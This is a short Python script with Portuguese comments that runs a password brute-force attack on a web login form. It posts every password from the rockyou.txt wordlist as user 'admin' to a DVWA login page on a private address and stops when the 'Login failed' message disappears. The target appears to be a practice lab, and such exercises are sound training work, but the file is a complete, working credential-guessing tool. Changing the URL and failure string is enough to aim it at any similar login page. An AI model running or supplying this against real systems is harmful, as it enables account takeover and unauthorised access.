import requests

# Configurações do Alvo
target_url = "http://192.168.1.4/dvwa/login.php"
username = "admin"
wordlist_path = "rockyou.txt"  # Certifique-se de que o arquivo está no mesmo diretório ou informe o caminho absoluto

# Mensagem de erro retornada pela aplicação em caso de falha
failure_message = "Login failed"

def attack():
    print(f"[*] Iniciando ataque de força bruta contra {target_url} para o usuário: {username}\n")
    
    # Abre a wordlist e testa senha por senha
    try:
        with open(wordlist_path, "r", encoding="latin-1") as file:
            for line in file:
                password = line.strip()
                
                # Dados enviados no corpo da requisição POST
                payload = {
                    "username": username,
                    "password": password,
                    "Login": "Login"
                }
                
                # Envia a requisição POST
                response = requests.post(target_url, data=payload)
                
                # Verifica se a mensagem de falha NÃO está presente na resposta
                if failure_message not in response.text:
                    print(f"[+] SUCESSO! Senha encontrada: {password}")
                    return
                else:
                    print(f"[-] Tentativa falha com a senha: {password}")
                    
        print("[-] Senha não encontrada na wordlist.")
        
    except FileNotFoundError:
        print(f"[!] Erro: O arquivo de wordlist '{wordlist_path}' não foi encontrado.")

if __name__ == "__main__":
    attack()